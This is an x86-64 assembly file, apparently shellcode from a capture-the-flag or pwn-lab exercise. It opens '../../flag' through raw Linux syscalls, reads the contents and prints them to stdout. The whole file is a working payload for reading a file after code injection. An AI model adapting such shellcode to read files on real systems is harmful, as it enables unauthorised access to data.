.global _start
.intel_syntax noprefix

_start:
    # Open syscall
    lea rdi, [rip + flag]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x02
    syscall

    # Read syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 1000
    xor rax, rax
    syscall

    # Write syscall
    mov rdi, 1
    mov rax, 0x01
    syscall

    # Exit syscall
    xor rdi, rdi
    mov rax, 0x3c
    syscall

flag:
    .string "../../flag"
